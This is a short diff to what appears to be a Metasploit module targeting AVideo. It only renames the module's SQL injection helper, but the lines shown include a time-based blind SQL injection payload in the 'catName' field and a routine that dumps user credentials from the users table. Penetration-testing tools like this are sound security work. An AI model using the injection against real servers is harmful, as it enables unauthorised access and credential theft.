@@ -9,7 +9,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   prepend Msf::Exploit::Remote::AutoCheck
 
-
   def initialize(info = {})
     super(
       update_info(
@@ -70,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
 
     setup_sqli
 
-    if @sqli.test_vulnerable
+    if @setup_sqli.test_vulnerable
       return Exploit::CheckCode::Vulnerable('Time-based blind SQLi confirmed via BENCHMARK()')
     end
 
@@ -84,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
     count = datastore['COUNT'] > 0 ? datastore['COUNT'] : 0
     print_status('Dumping user credentials from the users table...')
     print_warning('Time-based blind extraction is slow (~4s per character). Be patient.')
-    data = @sqli.dump_table_fields('users', columns, '', count)
+    data = @setup_sqli.dump_table_fields('users', columns, '', count)
 
     table = Rex::Text::Table.new(
       'Header' => 'AVideo Users',
@@ -131,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def setup_sqli
-    @sqli ||= create_sqli(dbms: MySQLi::BenchmarkBasedBlind, opts: { hex_encode_strings: true, safe: true }) do |payload|
+    @setup_sqli ||= create_sqli(dbms: MySQLi::BenchmarkBasedBlind, opts: { hex_encode_strings: true, safe: true }) do |payload|
       body = { 'catName' => "' OR #{payload} AND '1'='1", 'doNotShowCatChilds' => 1 }.to_json
 
       send_request_cgi({
